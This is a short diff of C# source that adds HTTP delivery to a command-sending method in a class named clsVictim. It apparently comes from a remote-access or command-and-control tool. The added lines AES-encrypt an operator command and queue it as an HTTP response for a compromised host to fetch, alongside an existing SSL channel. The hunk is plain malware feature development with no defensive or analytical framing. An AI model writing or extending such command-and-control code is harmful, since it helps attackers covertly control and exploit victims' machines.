@@ -160,7 +160,9 @@ public class clsVictim
                 fnSslSend(command);
                 break;
             case enListenerProtocol.HTTP:
-
+                var listener = (clsHttpListener)m_listener;
+                var pkt = new clsHttpListener.clsHttpResp(2, 0, Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv)));
+                listener.fnEnqueue(pkt);
                 break;
         }
     }
